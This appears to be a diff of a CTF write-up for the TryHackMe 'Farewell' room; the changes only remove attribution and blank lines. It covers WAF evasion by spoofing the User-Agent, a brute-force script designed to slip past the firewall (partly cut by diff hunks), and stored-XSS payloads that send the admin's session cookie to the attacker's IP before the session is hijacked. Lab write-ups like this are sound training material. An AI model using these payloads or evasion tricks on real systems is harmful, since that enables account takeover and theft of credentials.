@@ -1,37 +1,26 @@
 # :game_die: Farewell - THM Writeup. By: Kavin Jindal (@Klevr)
 
-> **Original Source:** [Farewell - THM Writeup. By: Kavin Jindal (@Klevr)](https://infosecwriteups.com/farewell-thm-writeup-9fb5a7c50fe3)
-> **Platform:** infosecwriteups.com | **Category:** `MISC`
-
 ---
 
 By: Kavin Jindal (@Klevr)
 
-
 ## Get Avyukt Security’s stories in your inbox
-
 
 Join Medium for free to get updates from this writer.
 
-
 Remember me for faster sign in
 
-
 [https://tryhackme.com/room/farewell](https://tryhackme.com/room/farewell)
-
 
 - Farewell is a medium-rated room on TryHackMe, based on WAF (Web Application Firewall) exploitation. It includes bypassing WAF restrictions to brute-force the password of a user account and then use Stored XSS to grab cookies of the admin account and elevate our privileges. In this writeup we will dive deep into every step of compromising the target in the room.
 
 ## -0x01: Recon
 
-
 - I started by running a TCP scan via NMAP on the target.
-
 
 ```
 nmap -p- -sC -sV 10.48.138.236
 ```
-
 
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-15 23:12 IST
@@ -56,65 +45,49 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 7.48 seconds
 ```
 
-
 - Nothing much here, after that, I visited the website on port 80.
-
 
 - It was a very basic login page but there was a scrolling element above the login form where I could see some usernames.
 
 - I viewed the page source and found the following
 
-
 - `adam` , `deliver11` and `nora` were three usernames that we could use to gain initial access to the website.
 
 - I tried using the above username in the login form for which I got the following error message.
-
 
 - The error message validated the existence of the username. If we tried some random value it would give us an `Invalid username or password` error.
 
 - Similarly, I tried using `admin` as the username and I got the following.
 
-
 - Next, I ran Gobuster to enumerate directories on the target. As WAF was deployed, I had to use a custom User-Agent. Using a custom User-Agent is important because Gobuster by default uses its own User-Agent which gets flagged by the firewall. Hence to bypass it, we use a legitimate-looking header to conduct directory enumeration.
-
 
 ```
 gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -x php,txt,js,json -u http://10.48.138.236 -a "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36"
 ```
 
-
 - The results of the scan were as follows.
-
 
 - `/admin.php` was a dedicated login page for `admin` which asked for a password.
 
-
 ## -0x02: User Access
-
 
 - Now, our first objective was to gain access to a user account. For that, I turned on Burp Suite and captured the login requests.
 
 - The response to the login requests had a `password_hint` parameter that revealed password hints for the specific user.
 
-
 *User: deliver11*
-
 
 *User: adam*
 
-
 *User: nora*
 
-
 *User: admin*
-
 
 - Now obviously, out of the four password hints I had received, finding the password of `deliver11` seemed the easiest of all.
 
 - `Capital of Japan followed by four digits` was the hint. The capital of Japan is Tokyo, hence that was half the password. The rest half required brute-forcing.
 
 - Using tools like Burp Intruder or `ffuf` would trigger the WAF and could not be used. Hence, I used a custom Python script to carry out the dictionary attack.
-
 
 ```
 import requests
@@ -153,9 +126,7 @@ print(f'[SUCCESS]Payload: "Tokyo{x}", Code: {resp.status_code} || Content: {len(
 break
 ```
 
-
 Explanation of the code
-
 
 - The primary objective here is to carry out the dictionary attack without triggering the firewall. For that, I had to make sure that the requests were not identical.
 
@@ -167,18 +138,13 @@ Explanation of the code
 
 - I ran the code and obtained the password as shown below.
 
-
 - I had successfully obtained the password for `deliver11` user. I used the credentials and logged in, after which I was redirected to `/dashboard.php` where I found the first flag.
-
 
 ## -0x03: Admin Access
 
-
 - The following page was obtained after logging in.
 
-
 - Here, I could send any message that would be approved by the `admin` user after some time.
-
 
 - What if we could execute XSS on the admin dashboard and grab session cookies to gain access?
 
@@ -186,19 +152,15 @@ Explanation of the code
 
 - Next, I used the following payload to remotely access a file and started a HTTP server at port 8000 on my machine.
 
-
 ```
 <img src='http://10.48.69.149:8000/burp.json'>
 ```
-
 
 ```
 python3 -m http.server 8000
 ```
 
-
 - I used the above payload and immediately received `GET` requests on the HTTP server.
-
 
 - This was an indication that the XSS vulnerability could be exploited and the session cookies could be stolen if the right payloads were used.
 
@@ -209,35 +171,24 @@ python3 -m http.server 8000
 
 - I used the following payload to send the session cookies to the HTTP server.
 
-
 ```
 <body onload="new Image().src='http://10.48.69.149:8001?x='+document['coo'+'kie']">
 ```
-
 
 - I used `document['coo'+'kie']` instead of `document.cookie` to bypass the WAF restrictions.
 
 - After using the above payload, I received the `admin` cookie on my server as follows.
 
-
 - I opened up Inspect Element and navigated to the Storage tab where `PHPSESSID` was stored.
-
 
 - I replaced it with the `admin` cookie obtained above and reloaded the page.
 
-
 - After that, I navigated to `/admin.php` .
-
 
 - And with that, I had successfully gained access to the admin panel and obtained the second flag, marking the completion of the room.
 
-
 I hope you found this walkthrough informative. Don’t forget to follow Avyukt Security for more quality cybersecurity content.
-
 
 Happy Hacking!
 
 ---
-
-*Originally published on [Medium](https://infosecwriteups.com/farewell-thm-writeup-9fb5a7c50fe3). All credit goes to the original author.*
-*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
